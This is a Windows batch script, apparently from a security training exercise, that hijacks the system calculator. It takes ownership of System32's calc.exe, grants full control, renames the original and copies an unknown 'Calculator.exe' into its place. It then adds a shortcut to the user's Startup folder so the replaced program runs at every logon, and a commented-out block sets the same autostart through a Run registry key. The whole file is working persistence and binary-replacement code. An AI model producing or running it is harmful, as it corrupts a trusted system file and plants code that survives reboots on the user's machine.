@echo off
cd C:\Windows\System32
takeown /f calc.exe
icacls calc.exe /grant Administrators:F
ren calc.exe old_calc.exe
copy .\Calculator.exe C:\Windows\System32\calc.exe

::ren calculator.exe calc.exe


::reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows
::\CurrentVersion\Run" /v "Calculator" /d "C:\Windows
::\System32\calc.exe /minimized" /f

set "sourceShortcut=D:\CyStack\Week_3_plus\calculator.bat - Shortcut.lnk"
set "destinationFolder=C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%sourceShortcut%" "%destinationFolder%"
start/min "" "calc.exe"
exit /b
pause